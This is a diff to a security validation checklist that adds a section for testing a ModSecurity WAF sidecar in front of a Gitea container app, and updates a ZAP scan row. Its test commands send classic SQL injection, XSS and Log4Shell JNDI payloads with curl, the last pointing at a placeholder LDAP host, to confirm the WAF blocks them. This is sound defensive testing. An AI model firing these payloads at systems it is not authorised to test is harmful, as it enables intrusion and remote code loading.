@@ -62,11 +62,27 @@ Use this as a validation checklist when capturing evidence for the BoK assessmen
 
 ---
 
+## WAF (Always-On Sidecar)
+
+The WAF (`owasp/modsecurity-crs:nginx-alpine`) is deployed as a sidecar container
+inside `ca-gitea`. It is active from the moment the Container App starts — no manual
+steps required. Test it by sending attack payloads directly to the live Gitea URL.
+
+| Control | Setting / Tool | Test Method | Expected Result | Evidence File |
+|---------|---------------|-------------|-----------------|---------------|
+| ModSecurity blocking mode | `MODSEC_RULE_ENGINE=On` in `terraform/aca.tf` | `./scripts/waf/test-waf.sh https://ca-gitea.wittydune-da50dd5c.norwayeast.azurecontainerapps.io` | Attack payloads return 403; normal requests pass (200/302) | `phase10-waf/waf-test-output.txt` |
+| WAF blocks SQLi | OWASP CRS rule 942xxx | `curl "https://.../user/login?q=1'+OR+'1'='1"` | HTTP 403 from ModSecurity | `phase10-waf/screenshot-waf-block.png` |
+| WAF blocks XSS | OWASP CRS rule 941xxx | `curl "https://.../search?q=<script>alert(1)</script>"` | HTTP 403 from ModSecurity | `phase10-waf/screenshot-waf-block.png` |
+| WAF blocks Log4Shell | OWASP CRS rule 932xxx | `curl -H "X-Api-Version: \${jndi:ldap://x.x/a}" https://...` | HTTP 403 from ModSecurity | `phase10-waf/screenshot-waf-block.png` |
+| WAF logs in Log Analytics | ContainerAppConsoleLogs_CL, ContainerName_s=="waf" | Run KQL query #9 from `docs/detections/kql-queries.md` | ModSecurity block entries visible | `phase10-waf/screenshot-waf-block.png` |
+
+---
+
 ## DAST
 
 | Control | Setting / Tool | Test Method | Expected Result | Evidence File |
 |---------|---------------|-------------|-----------------|---------------|
-| OWASP ZAP baseline scan | `scripts/dast/run-zap-baseline.sh` or GitHub Actions `dast.yml` | Run manually: `./scripts/dast/run-zap-baseline.sh` | ZAP report with 0 FAIL-level alerts (login redirect correctly handled) | `zap-reports/zap-report.html` |
+| OWASP ZAP baseline scan | `scripts/dast/run-zap-baseline.sh` or GitHub Actions `dast.yml` (runs weekly on schedule) | Run manually: `./scripts/dast/run-zap-baseline.sh` OR check Actions → DAST — ZAP Baseline Scan | ZAP report with 0 FAIL-level alerts | `phase9-dast/zap-report.html` |
 
 ---
 
